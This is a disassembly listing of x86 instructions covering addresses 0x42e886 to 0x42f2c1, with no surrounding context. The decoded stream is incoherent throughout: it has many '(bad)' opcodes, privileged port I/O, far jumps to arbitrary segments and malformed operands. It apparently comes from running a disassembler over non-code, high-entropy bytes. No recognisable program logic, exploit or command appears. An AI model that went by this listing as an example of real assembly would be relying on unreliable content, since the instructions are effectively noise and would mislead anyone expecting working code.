  42e886:	and    BYTE PTR [edx-0x649a8860],bl
  42e88c:	ins    BYTE PTR es:[edi],dx
  42e88d:	inc    esp
  42e88e:	xchg   esi,eax
  42e88f:	push   ebp
  42e890:	inc    edx
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x63dc07d5]
  42e901:	xor    BYTE PTR [ecx+0x1f3684f],0x0
  42e908:	add    eax,0x6000001
  42e90d:	mov    bl,0xcd
  42e90f:	out    dx,al
  42e910:	sub    ch,BYTE PTR [eax+0x3d]
  42e913:	pop    esp
  42e914:	inc    ebp
  42e915:	add    dl,dl
  42e917:	jnp    0x42e973
  42e919:	ret    
  42e91a:	push   ecx
  42e91b:	dec    esi
  42e91c:	sbb    BYTE PTR [edx+0x14dad58a],0x86
  42e923:	mov    ds,ebx
  42e925:	dec    eax
  42e926:	daa    
  42e927:	loope  0x42e963
  42e929:	jb     0x42e94c
  42e92b:	ins    BYTE PTR es:[edi],dx
  42e92c:	mov    ebp,0x6b3853e1
  42e931:	ret    
  42e932:	cdq    
  42e933:	and    cl,BYTE PTR [ebx-0x12]
  42e936:	jl     0x42e8df
  42e938:	pop    ebx
  42e939:	push   edi
  42e93a:	(bad)  
  42e93b:	mov    ?,WORD PTR [ebp+0x42adbfe]
  42e941:	fmul   QWORD PTR [edi-0x32555fa0]
  42e947:	sbb    esi,ebp
  42e949:	inc    ecx
  42e94a:	ror    DWORD PTR es:[ebp+0x2d92e9b0],1
  42e951:	add    al,dl
  42e953:	push   ecx
  42e954:	mov    dl,0x9d
  42e956:	adc    DWORD PTR [eax-0x9],ebp
  42e959:	cwde   
  42e95a:	jmp    0x7888:0x1fa05a07
  42e961:	fisub  WORD PTR [ebx]
  42e963:	ret    0x4803
  42e966:	mov    ah,0x5f
  42e968:	test   al,0x59
  42e96a:	dec    ecx
  42e96b:	stos   DWORD PTR es:[edi],eax
  42e96c:	xchg   ecx,eax
  42e96d:	sub    ebp,ebx
  42e96f:	aaa    
  42e970:	sub    BYTE PTR [ecx+0x3bc488cf],0xc5
  42e977:	in     eax,0xde
  42e979:	popf   
  42e97a:	inc    ecx
  42e97b:	repz and BYTE PTR [ecx-0x365f2416],bh
  42e982:	pop    edi
  42e983:	aam    0x83
  42e985:	and    DWORD PTR [ebp+ebx*1+0x37],0xffffffc1
  42e98a:	(bad)  
  42e98b:	div    BYTE PTR [edx]
  42e98d:	xchg   edi,eax
  42e98e:	(bad)  
  42e990:	call   DWORD PTR [ecx+0x2a]
  42e993:	repnz into 
  42e995:	mov    al,ds:0xc1b79845
  42e99a:	das    
  42e99b:	icebp  
  42e99c:	into   
  42e99d:	cli    
  42e99e:	cs push ebx
  42e9a0:	aam    0x56
  42e9a2:	ror    BYTE PTR [edx+0x5],cl
  42e9a5:	scas   al,BYTE PTR es:[edi]
  42e9a6:	xchg   edi,eax
  42e9a7:	jbe    0x42e92a
  42e9a9:	pop    eax
  42e9aa:	dec    ebp
  42e9ab:	(bad)  [ebp-0x364537d2]
  42e9b1:	fst    DWORD PTR [edi+0x1]
  42e9b4:	sbb    esp,DWORD PTR [edx+0x695bc017]
  42e9ba:	jecxz  0x42e97f
  42e9bc:	out    0x61,al
  42e9be:	popa   
  42e9bf:	cs call 0x6fa922ab
  42e9c5:	aam    0x67
  42e9c7:	xor    BYTE PTR [ebx-0x12d23e28],cl
  42e9cd:	std    
  42e9ce:	js     0x42e972
  42e9d0:	push   ds
  42e9d1:	cmp    ebp,edi
  42e9d3:	xor    eax,0x349465d
  42e9d8:	mov    ds:0x6f7117a6,al
  42e9dd:	mov    BYTE PTR [ebx+edi*8],cl
  42e9e0:	mov    eax,0x8c215b92
  42e9e5:	stos   DWORD PTR es:[edi],eax
  42e9e6:	xchg   ebx,eax
  42e9e7:	mov    eax,DWORD PTR [esi-0x61]
  42e9ea:	aaa    
  42e9eb:	xor    al,0x7e
  42e9ed:	rol    ebx,0x8b
  42e9f0:	sbb    DWORD PTR [ecx+0x56],ecx
  42e9f3:	pop    edx
  42e9f4:	mov    ds:0xa313fa24,eax
  42e9f9:	in     al,0x62
  42e9fb:	enter  0xa315,0xaa
  42e9ff:	ins    DWORD PTR es:[edi],dx
  42ea00:	mov    al,0x75
  42ea02:	call   0x40e2:0xcaad1166
  42ea09:	out    0xfc,al
  42ea0b:	or     al,0xaa
  42ea0d:	aaa    
  42ea0e:	rol    DWORD PTR [edi+0xe8],cl
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	ins    BYTE PTR es:[edi],dx
  42ea81:	enter  0xfe1a,0x6d
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x1000001
  42ea8d:	xlat   BYTE PTR ds:[ebx]
  42ea8e:	jns    0x42ea66
  42ea90:	clc    
  42ea91:	(bad)  
  42ea93:	and    al,0x4d
  42ea95:	add    eax,ecx
  42ea97:	stos   DWORD PTR es:[edi],eax
  42ea98:	inc    ebx
  42ea99:	popa   
  42ea9a:	iret   
  42ea9b:	test   BYTE PTR [ecx],0xeb
  42ea9e:	jl     0x42ea67
  42eaa0:	or     DWORD PTR [ebx],edx
  42eaa2:	push   es
  42eaa3:	lea    ecx,[esp+ebx*8-0x38]
  42eaa7:	pop    edx
  42eaa8:	pushf  
  42eaa9:	jne    0x42ea3b
  42eaab:	sbb    DWORD PTR [edi-0x1b],esi
  42eaae:	div    DWORD PTR ds:0xf586e97c
  42eab4:	mov    ecx,edi
  42eab6:	popf   
  42eab7:	mov    ecx,0x91e930b2
  42eabc:	rol    BYTE PTR [ebp+0x7472c9c8],1
  42eac2:	push   esp
  42eac3:	loopne 0x42ea91
  42eac5:	ins    BYTE PTR es:[edi],dx
  42eac6:	stos   BYTE PTR es:[edi],al
  42eac7:	aad    0x61
  42eac9:	jg     0x42ea98
  42eacb:	dec    BYTE PTR [eax+0x7f17d710]
  42ead1:	pusha  
  42ead2:	cs aas 
  42ead4:	adc    eax,0x3db971f0
  42ead9:	cmc    
  42eada:	sti    
  42eadb:	sbb    BYTE PTR [ebx],dh
  42eadd:	add    eax,0x2719b944
  42eae2:	mov    ebp,DWORD PTR [ecx+edx*2+0x6e]
  42eae6:	rol    BYTE PTR [esi+0x25d9537c],cl
  42eaec:	add    esi,DWORD PTR [ebx+0x1fe2590b]
  42eaf2:	jge    0x42eb59
  42eaf4:	mov    edi,0x5807f947
  42eaf9:	sub    al,0xbe
  42eafb:	rcr    BYTE PTR [edi-0x7],0x76
  42eaff:	pop    ss
  42eb00:	cmp    DWORD PTR [eax],0x3b6cc848
  42eb06:	cdq    
  42eb07:	jp     0x42ead8
  42eb09:	daa    
  42eb0a:	fisub  WORD PTR [ecx+ebx*1]
  42eb0d:	push   ebx
  42eb0e:	mov    dh,0xb6
  42eb10:	or     al,0x91
  42eb12:	mov    edx,0x77ff2269
  42eb17:	xor    ebp,DWORD PTR [eax-0x68]
  42eb1a:	jle    0x42eac3
  42eb1c:	dec    esi
  42eb1d:	out    dx,eax
  42eb1e:	add    eax,0xa24fd747
  42eb23:	jge    0x42eb48
  42eb25:	jg     0x42eb44
  42eb27:	mov    ?,WORD PTR [edx+0x285548e2]
  42eb2d:	adc    dh,BYTE PTR [ebx+edi*1]
  42eb30:	imul   ebx,DWORD PTR [eax-0x24914a4d],0x49
  42eb37:	les    esi,FWORD PTR ds:0x438122c8
  42eb3d:	das    
  42eb3e:	jnp    0x42eb15
  42eb40:	dec    esi
  42eb41:	(bad)
  42eb44:	or     cl,BYTE PTR [ebp+0x2]
  42eb47:	arpl   WORD PTR ds:0x8a401b08,si
  42eb4d:	jns    0x42eb8e
  42eb4f:	xor    al,0xb
  42eb51:	mov    al,0xd0
  42eb53:	jp     0x42eafc
  42eb55:	push   eax
  42eb56:	outs   dx,BYTE PTR ds:[si]
  42eb58:	ret    0x6b38
  42eb5b:	shl    dl,cl
  42eb5d:	inc    edx
  42eb5e:	ror    BYTE PTR [ebx+0x647f3981],1
  42eb64:	inc    ecx
  42eb65:	(bad)  
  42eb66:	loop   0x42eb0b
  42eb68:	(bad)  
  42eb6a:	iret   
  42eb6b:	jne    0x42ebae
  42eb6d:	sbb    eax,0xe4242002
  42eb72:	jg     0x42ebca
  42eb74:	(bad)  
  42eb75:	push   es
  42eb76:	cdq    
  42eb77:	and    eax,0xaa9194e2
  42eb7c:	push   ebp
  42eb7d:	aaa    
  42eb7e:	jno    0x42eb79
  42eb80:	cwde   
  42eb81:	retf   0xbc9a
  42eb84:	dec    esp
  42eb85:	imul   esp,DWORD PTR [ebx+0xc],0xb401001c
  42eb8c:	fbld   TBYTE PTR [edx]
  42eb8e:	or     esp,0x10
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    eax,0x725d0346
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0x1f000001
  42ec0d:	aam    0xa4
  42ec0f:	fcmove st,st(6)
  42ec11:	dec    edx
  42ec12:	iret   
  42ec13:	xor    al,0x52
  42ec15:	ins    DWORD PTR es:[edi],dx
  42ec16:	daa    
  42ec17:	out    0xe4,eax
  42ec19:	iret   
  42ec1a:	add    al,0xf2
  42ec1c:	xor    al,0x75
  42ec1e:	mov    ebp,DWORD PTR [edx-0x44]
  42ec21:	xor    DWORD PTR [ebp-0x7fea713c],0xffffffe4
  42ec28:	mov    ah,0x3f
  42ec2a:	shr    ebp,cl
  42ec2c:	data16 in al,dx
  42ec2e:	cdq    
  42ec2f:	loopne 0x42ebb2
  42ec31:	loopne 0x42ec7a
  42ec33:	fsub   st,st(7)
  42ec35:	jp     0x42ec3c
  42ec37:	in     al,dx
  42ec38:	mov    ?,WORD PTR [esi]
  42ec3a:	cmp    dl,BYTE PTR [edx+0x25]
  42ec3d:	push   cs
  42ec3e:	out    dx,eax
  42ec3f:	push   esi
  42ec40:	ja     0x42ec8f
  42ec42:	(bad)  
  42ec43:	sbb    eax,0x8f3a03a0
  42ec48:	push   esi
  42ec49:	aam    0x53
  42ec4b:	mov    esp,0x88a1bafe
  42ec50:	popa   
  42ec51:	dec    esp
  42ec52:	rol    BYTE PTR [esi+0xdf1fa53],1
  42ec58:	sub    eax,0x16d6ef63
  42ec5d:	mov    ds:0x4f6dce07,eax
  42ec62:	scas   eax,DWORD PTR es:[edi]
  42ec63:	mov    ds:0xe538327e,eax
  42ec68:	sar    bl,cl
  42ec6a:	std    
  42ec6b:	mov    esi,0x4266609b
  42ec70:	xchg   ebp,eax
  42ec71:	mov    esp,DWORD PTR ds:0xbf08f75e
  42ec77:	jmp    0x6303:0x1deee5b6
  42ec7e:	lods   eax,DWORD PTR ds:[esi]
  42ec7f:	push   eax
  42ec80:	mov    bh,0x80
  42ec82:	adc    al,0xfe
  42ec84:	imul   ebp,DWORD PTR [edi-0x71],0x56bdcce3
  42ec8b:	ins    DWORD PTR es:[edi],dx
  42ec8c:	lahf   
  42ec8d:	test   BYTE PTR [edi-0x1d46deca],dl
  42ec93:	sub    BYTE PTR [ebx-0x6728260e],ah
  42ec99:	out    0x12,al
  42ec9b:	test   DWORD PTR [ebp-0x573c7f8a],edi
  42eca1:	jnp    0x42ec98
  42eca3:	lock adc DWORD PTR [eax+0x466516b7],edi
  42ecaa:	adc    dl,ah
  42ecac:	cmp    ebx,esp
  42ecae:	cdq    
  42ecaf:	sbb    eax,0xed7f42d7
  42ecb4:	int    0xc1
  42ecb6:	xchg   DWORD PTR [ecx],edi
  42ecb8:	push   cs
  42ecb9:	(bad)  
  42ecba:	fsubr  QWORD PTR [ecx+0x30]
  42ecbd:	push   ecx
  42ecbe:	or     DWORD PTR [edi+0x6540167],0x53b364fe
  42ecc8:	into   
  42ecc9:	inc    esi
  42ecca:	sbb    eax,0xa5cc22d5
  42eccf:	jmp    0x963b478e
  42ecd4:	or     al,0x89
  42ecd6:	jg     0x42eccb
  42ecd8:	push   0x2535277a
  42ecdd:	and    bh,BYTE PTR [eax+ebx*4+0x23]
  42ece1:	sub    BYTE PTR [ebx],0x13
  42ece4:	sub    al,0x5e
  42ece6:	inc    esp
  42ece7:	test   al,0x3
  42ece9:	pop    ecx
  42ecea:	out    dx,eax
  42eceb:	or     edx,ecx
  42eced:	mov    ah,BYTE PTR [eax-0x6243b479]
  42ecf3:	jecxz  0x42ecba
  42ecf5:	aam    0xff
  42ecf7:	mov    al,BYTE PTR [eax+0x77]
  42ecfa:	dec    edx
  42ecfb:	push   cs
  42ecfc:	adc    edi,edi
  42ecfe:	test   bl,cl
  42ed00:	inc    ecx
  42ed01:	fild   DWORD PTR [edi+edi*8+0x42]
  42ed05:	push   ebx
  42ed06:	lahf   
  42ed07:	push   eax
  42ed08:	adc    eax,0x722b4b99
  42ed0d:	mov    eax,ds:0x337e97
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x4b972da0],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x68000001
  42ed8d:	mov    eax,cr1
  42ed90:	pop    ebp
  42ed91:	dec    edx
  42ed92:	lock out dx,al
  42ed94:	repz in al,dx
  42ed96:	inc    ecx
  42ed97:	add    WORD PTR [ebp+eax*4-0x75],cx
  42ed9c:	daa    
  42ed9d:	jecxz  0x42eda3
  42ed9f:	imul   esi,DWORD PTR es:[edx-0x49],0x213ed90c
  42eda7:	rcl    bh,cl
  42eda9:	test   BYTE PTR [esi+0x7b],cl
  42edac:	(bad)  
  42edad:	sub    eax,0x26c40e06
  42edb2:	fcmovu st,st(2)
  42edb4:	aad    0xce
  42edb6:	push   ds
  42edb7:	std    
  42edb8:	xchg   ebp,eax
  42edb9:	cmp    edi,edi
  42edbb:	push   ds
  42edbc:	lock jle 0x42edbd
  42edbf:	bound  edi,QWORD PTR [ebp+0x19fd2e75]
  42edc5:	mov    ebp,0x74ed69a2
  42edca:	push   0x6a
  42edcc:	xor    BYTE PTR [eax],al
  42edce:	or     DWORD PTR [edi+0x7163fb0a],ecx
  42edd4:	inc    ebp
  42edd5:	mov    edx,0xbc8dd971
  42edda:	jbe    0x42eda1
  42eddc:	mov    eax,ds:0xe6a8e879
  42ede1:	fcmovnb st,st(5)
  42ede3:	aam    0x8
  42ede5:	cwde   
  42ede6:	ret    0xd8c5
  42ede9:	mov    cl,0xfa
  42edeb:	in     eax,0x37
  42eded:	pusha  
  42edee:	(bad)
  42edf1:	ins    BYTE PTR es:[edi],dx
  42edf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edf3:	arpl   dx,cx
  42edf5:	xor    cl,cl
  42edf7:	not    esp
  42edf9:	ret    
  42edfa:	push   cs
  42edfb:	sub    BYTE PTR [edi],bh
  42edfd:	mov    ds:0x45300a17,al
  42ee02:	jae    0x42edee
  42ee04:	dec    edx
  42ee05:	xor    DWORD PTR [esi-0x2cfb122c],0x25eaeac2
  42ee0f:	push   ds
  42ee10:	nop
  42ee11:	sub    al,0x88
  42ee13:	rol    DWORD PTR [eax],1
  42ee15:	lds    edi,FWORD PTR [edi-0x711f6334]
  42ee1b:	js     0x42ee19
  42ee1d:	xchg   BYTE PTR [esi],ah
  42ee1f:	cli    
  42ee20:	(bad)  
  42ee21:	dec    ebp
  42ee22:	sub    BYTE PTR [edx-0x16],al
  42ee25:	fs aam 0x1f
  42ee28:	aaa    
  42ee29:	les    eax,FWORD PTR [eax]
  42ee2b:	loope  0x42ee65
  42ee2d:	dec    ebx
  42ee2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee2f:	lock inc edi
  42ee31:	popa   
  42ee32:	test   cl,bh
  42ee34:	mov    eax,ds:0x7e0b7cf8
  42ee39:	fisub  DWORD PTR [ecx-0x7a]
  42ee3c:	js     0x42ee50
  42ee3e:	xor    DWORD PTR [edi],ebx
  42ee40:	sub    DWORD PTR ds:0x98264fc6,ebx
  42ee46:	cmc    
  42ee47:	(bad)  
  42ee48:	sbb    DWORD PTR [ebx+ebp*8+0x2ea4dc13],ecx
  42ee4f:	or     DWORD PTR [eax-0x32ea82ce],ebp
  42ee55:	loope  0x42ee03
  42ee57:	out    0x27,eax
  42ee59:	aas    
  42ee5a:	push   0x9060e196
  42ee5f:	cli    
  42ee60:	fisub  DWORD PTR [esi+0x380af33d]
  42ee66:	mov    ecx,0x1109fe8e
  42ee6b:	sub    DWORD PTR [esi],ebp
  42ee6d:	ficom  DWORD PTR [edi+ebp*1+0x6550c2e8]
  42ee74:	pop    ebx
  42ee75:	fnstsw WORD PTR [eax]
  42ee77:	push   esi
  42ee78:	outs   dx,DWORD PTR ds:[esi]
  42ee79:	in     eax,0x97
  42ee7b:	jae    0x42ee21
  42ee7d:	xchg   DWORD PTR [eax],eax
  42ee7f:	into   
  42ee80:	rcr    ebx,0x92
  42ee83:	aam    0x61
  42ee85:	not    DWORD PTR [edi-0x7a45d5f4]
  42ee8b:	inc    ecx
  42ee8c:	mov    ah,0x57
  42ee8e:	(bad)  
  42ee8f:	loopne 0x42eebc
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	out    0x87,eax
  42ef02:	sub    DWORD PTR [ebp+0x1f77c],esp
  42ef08:	add    eax,0x2000001
  42ef0d:	dec    eax
  42ef0e:	cmp    eax,0x6dca1189
  42ef13:	push   eax
  42ef14:	add    eax,0xd37b740
  42ef19:	and    al,BYTE PTR [edx]
  42ef1b:	aaa    
  42ef1c:	mov    ebp,0xd2efd80d
  42ef21:	retf   0xea08
  42ef24:	xchg   esi,eax
  42ef25:	imul   eax,ebp,0xab7e6726
  42ef2b:	mov    dl,0xbb
  42ef2d:	mov    al,0x6a
  42ef2f:	jmp    0x783b:0x15190b24
  42ef36:	stos   BYTE PTR es:[edi],al
  42ef37:	int3   
  42ef38:	(bad)  [eax+0x1142be77]
  42ef3e:	mov    edx,0xe4845168
  42ef43:	imul   esi,DWORD PTR [esi*4+0x42b0b1ba],0x49d96c36
  42ef4e:	das    
  42ef4f:	adc    al,0x9
  42ef51:	fwait
  42ef52:	outs   dx,BYTE PTR ds:[esi]
  42ef53:	push   esi
  42ef54:	leave  
  42ef55:	aas    
  42ef56:	lods   eax,DWORD PTR ds:[esi]
  42ef57:	pop    ebp
  42ef58:	es std 
  42ef5a:	mov    bh,0x69
  42ef5c:	inc    esp
  42ef5d:	js     0x42efa8
  42ef5f:	mov    esi,DWORD PTR [edi-0x3d26790b]
  42ef65:	xor    BYTE PTR [ebx-0x3cf754a6],cl
  42ef6b:	push   ebp
  42ef6c:	mov    ch,0x1e
  42ef6e:	xchg   ebp,eax
  42ef6f:	inc    edi
  42ef70:	jp     0x42efee
  42ef72:	loop   0x42ef1c
  42ef74:	push   0x4a
  42ef76:	mov    dl,0x51
  42ef78:	inc    edx
  42ef79:	jmp    0x9f1c0a16
  42ef7e:	cwde   
  42ef7f:	xchg   esp,eax
  42ef80:	mov    esi,0x8b57499f
  42ef85:	mov    dl,0xb9
  42ef87:	dec    esp
  42ef88:	sub    ch,cl
  42ef8a:	(bad)  
  42ef8b:	and    ebp,ebp
  42ef8d:	es retf 0xd835
  42ef91:	dec    eax
  42ef92:	sbb    eax,0xaa794f3c
  42ef97:	les    edx,FWORD PTR [eax-0x58]
  42ef9a:	out    dx,al
  42ef9b:	aaa    
  42ef9c:	fistp  QWORD PTR [ebp-0x1e]
  42ef9f:	shr    BYTE PTR [eax-0x65],1
  42efa2:	add    DWORD PTR [edx+esi*8+0x7a],edx
  42efa6:	xchg   edx,eax
  42efa7:	xchg   edi,eax
  42efa8:	xor    edx,edi
  42efaa:	in     eax,0xeb
  42efac:	and    ah,ch
  42efae:	jo     0x42ef5b
  42efb0:	mov    eax,esi
  42efb2:	scas   eax,DWORD PTR es:[edi]
  42efb3:	dec    eax
  42efb4:	xchg   ebp,eax
  42efb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efb6:	push   eax
  42efb7:	add    al,0x2e
  42efb9:	ror    BYTE PTR [esi+0xb],0x14
  42efbd:	xchg   DWORD PTR [eax],ebx
  42efbf:	jp     0x42ef46
  42efc1:	aam    0xe
  42efc3:	aad    0x82
  42efc5:	pop    DWORD PTR [ecx+0x8]
  42efc8:	in     al,dx
  42efc9:	mov    eax,DWORD PTR [ecx]
  42efcb:	bound  ecx,QWORD PTR [edx+0x5e21f5d0]
  42efd1:	sbb    BYTE PTR [ebp+0x3039061],0x79
  42efd8:	iret   
  42efd9:	or     ebx,DWORD PTR [ecx+edi*2-0x7af320cf]
  42efe0:	push   ss
  42efe1:	jbe    0x42f012
  42efe3:	xchg   esp,eax
  42efe4:	cmp    ah,BYTE PTR [eax-0x108fb051]
  42efea:	bound  ecx,QWORD PTR [ebp+0x600898cb]
  42eff0:	mov    BYTE PTR [edx+0x31b3c740],ch
  42eff6:	push   ebp
  42eff7:	inc    esp
  42eff8:	cmc    
  42eff9:	add    eax,0x45fae70b
  42effe:	inc    edx
  42efff:	mov    ebx,0x638f1a38
  42f004:	cmp    dl,BYTE PTR [edx-0x79]
  42f007:	pushf  
  42f008:	jmp    0x42f06b
  42f00a:	and    al,0xcf
  42f00c:	scas   eax,DWORD PTR es:[edi]
  42f00d:	push   edx
  42f00e:	dec    ecx
  42f00f:	dec    edx
  42f010:	lods   eax,DWORD PTR ds:[esi]
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	push   ebx
  42f081:	je     0x42f0b6
  42f083:	push   ecx
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	xor    al,0x72
  42f08e:	arpl   WORD PTR [edi-0x3b621c4d],si
  42f094:	xchg   esp,eax
  42f095:	xchg   ecx,eax
  42f096:	and    al,0xce
  42f098:	pushf  
  42f099:	pop    ebx
  42f09a:	clc    
  42f09b:	icebp  
  42f09c:	pop    ecx
  42f09d:	imul   eax,DWORD PTR [eax+0x7b],0xe2d19624
  42f0a4:	xor    al,0x6d
  42f0a6:	outs   dx,BYTE PTR ds:[esi]
  42f0a7:	imul   edi
  42f0a9:	push   ds
  42f0aa:	out    0xa2,eax
  42f0ac:	push   ss
  42f0ad:	and    DWORD PTR [ecx+0x33277c9d],0x2074cc11
  42f0b7:	mov    eax,DWORD PTR ds:0xf775f5ba
  42f0bd:	out    0xdf,al
  42f0bf:	pop    ds
  42f0c0:	mov    ebp,0xca19f493
  42f0c5:	mov    dl,0x8b
  42f0c7:	(bad)  
  42f0c8:	push   cs
  42f0c9:	xor    eax,ecx
  42f0cb:	fcmovnu st,st(3)
  42f0cd:	or     dh,0x7f
  42f0d0:	iret   
  42f0d1:	cmp    ecx,edx
  42f0d3:	fdivr  DWORD PTR [ebx+0x14aa6092]
  42f0d9:	or     edx,eax
  42f0db:	pop    es
  42f0dc:	xchg   ebx,eax
  42f0dd:	push   esp
  42f0de:	jg     0x42f0ab
  42f0e0:	mov    ebp,0x1d951f57
  42f0e5:	lds    ecx,FWORD PTR [edx-0x3767ea9a]
  42f0eb:	xor    DWORD PTR [edx+0x1cba87b5],0x68264782
  42f0f5:	and    bl,dh
  42f0f7:	and    edi,DWORD PTR [edi]
  42f0f9:	cmp    bh,bl
  42f0fb:	in     al,0x85
  42f0fd:	jmp    0x42f082
  42f0ff:	mov    edi,edi
  42f101:	js     0x42f100
  42f103:	pop    ebx
  42f104:	shl    BYTE PTR [ebp+0x3a155c85],1
  42f10a:	mov    eax,ds:0x9fb8127d
  42f10f:	push   es
  42f110:	cmp    al,0x5e
  42f112:	lods   al,BYTE PTR ds:[esi]
  42f113:	add    dl,dh
  42f115:	clc    
  42f116:	inc    edx
  42f117:	and    DWORD PTR [edx+ebp*1-0x74],ecx
  42f11b:	pop    es
  42f11c:	mov    ds:0xb530183c,eax
  42f121:	inc    ebx
  42f122:	cmp    eax,0xd31d8669
  42f127:	pop    eax
  42f128:	lahf   
  42f129:	je     0x42f123
  42f12b:	inc    eax
  42f12c:	mov    ecx,DWORD PTR [ebp-0x45]
  42f12f:	lods   al,BYTE PTR ds:[esi]
  42f130:	push   0x7d361ba2
  42f135:	mov    ch,0x47
  42f137:	pop    ebp
  42f138:	lock jmp 0xb3f3:0xa244abc
  42f140:	or     esi,esp
  42f142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f143:	xor    ax,WORD PTR [edx-0x6bdf43a3]
  42f14a:	outs   dx,DWORD PTR ds:[esi]
  42f14b:	lods   al,BYTE PTR ds:[esi]
  42f14c:	pop    ebp
  42f14d:	je     0x42f16b
  42f14f:	nop
  42f150:	dec    ebp
  42f151:	add    bl,dl
  42f153:	data16 jl 0x42f195
  42f156:	cmp    edi,DWORD PTR [eax-0x1d]
  42f159:	push   edi
  42f15a:	jecxz  0x42f13d
  42f15c:	imul   ebp,DWORD PTR [ebp+0x67],0x1
  42f160:	shl    DWORD PTR [ebx+ebp*8-0x71],0x11
  42f165:	dec    ebx
  42f166:	add    BYTE PTR [edx+0x7e598b5e],dl
  42f16c:	leave  
  42f16d:	xor    bl,BYTE PTR [edx]
  42f16f:	je     0x42f0f7
  42f171:	test   DWORD PTR [ebp+0x5c],esp
  42f174:	mov    eax,ds:0x1247fe31
  42f179:	jno    0x42f19e
  42f17b:	inc    eax
  42f17c:	xchg   ebx,eax
  42f17d:	ss aaa 
  42f17f:	dec    ebx
  42f180:	push   eax
  42f181:	and    BYTE PTR [edx+eax*1+0x22],bl
  42f185:	mov    eax,ds:0xa8f32870
  42f18a:	add    dh,BYTE PTR [ebp-0x50f968b5]
  42f190:	jg     0x42f192
	...
  42f1f2:	add    BYTE PTR [eax],al
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	stc    
  42f201:	and    al,0xb7
  42f203:	test   DWORD PTR [esi+0x50001f9],eax
  42f209:	add    DWORD PTR [eax],eax
  42f20b:	add    BYTE PTR [edx],bh
  42f20d:	mov    BYTE PTR ds:0x261af605,cl
  42f213:	loopne 0x42f252
  42f215:	xlat   BYTE PTR ds:[ebx]
  42f216:	jmp    0xbaf4:0xffd4a60c
  42f21d:	test   al,0x19
  42f21f:	mov    edx,DWORD PTR [eax]
  42f221:	xor    bh,BYTE PTR [ebx+edx*1-0x6d0487e4]
  42f228:	push   0x57
  42f22a:	sbb    cl,BYTE PTR [edx-0x4f845595]
  42f230:	mov    ds:0x5128d94,eax
  42f235:	hlt    
  42f236:	xchg   edi,eax
  42f237:	idiv   DWORD PTR [ecx]
  42f239:	xlat   BYTE PTR ds:[ebx]
  42f23a:	retf   
  42f23b:	mov    ah,0xbd
  42f23d:	nop
  42f23e:	mov    eax,0x3dcba2a9
  42f243:	mul    BYTE PTR [edi+ebp*1+0x5f]
  42f247:	in     al,dx
  42f248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f249:	mov    ds:0x5cd71911,eax
  42f24e:	and    bl,BYTE PTR [esi]
  42f250:	fsub   DWORD PTR [ecx-0x52a2529b]
  42f256:	out    0xa2,eax
  42f258:	sar    BYTE PTR [ecx+0x1],0x25
  42f25c:	fs mov edx,0x419ed37b
  42f262:	push   edi
  42f263:	cs clc 
  42f265:	jne    0x42f208
  42f267:	push   ecx
  42f268:	fisttp QWORD PTR [ebx]
  42f26a:	fldcw  WORD PTR ss:[ebp-0x2300fe74]
  42f271:	pop    edi
  42f272:	icebp  
  42f273:	mov    dh,0x7d
  42f275:	mov    ah,0xd0
  42f277:	mov    esi,0xceb6ec99
  42f27c:	jbe    0x42f209
  42f27e:	adc    BYTE PTR [ebx-0x2a47eeb8],0xc
  42f285:	out    0x12,al
  42f287:	jg     0x42f237
  42f289:	test   eax,0x63d1aa5e
  42f28e:	cli    
  42f28f:	mov    bl,0x63
  42f291:	dec    ecx
  42f292:	sbb    BYTE PTR [esi+0x246ea780],bl
  42f298:	xor    ecx,DWORD PTR [edx+ecx*2+0x73ba1b99]
  42f29f:	std    
  42f2a0:	mov    ch,0x42
  42f2a2:	push   ecx
  42f2a3:	or     ch,ch
  42f2a5:	shr    DWORD PTR [ecx+0x78],cl
  42f2a8:	add    al,0x8d
  42f2aa:	int3   
  42f2ab:	add    BYTE PTR [eax+0x7f],dl
  42f2ae:	mov    eax,0x193edc96
  42f2b3:	dec    ebp
  42f2b4:	out    0x60,eax
  42f2b6:	pop    esp
  42f2b7:	mov    fs,WORD PTR [ecx]
  42f2b9:	mov    al,ds:0xc06703ad
  42f2be:	(bad)  
  42f2bf:	in     eax,dx
  42f2c0:	pop    esp
  42f2c1:	scas   eax,DWORD PTR es:[edi]
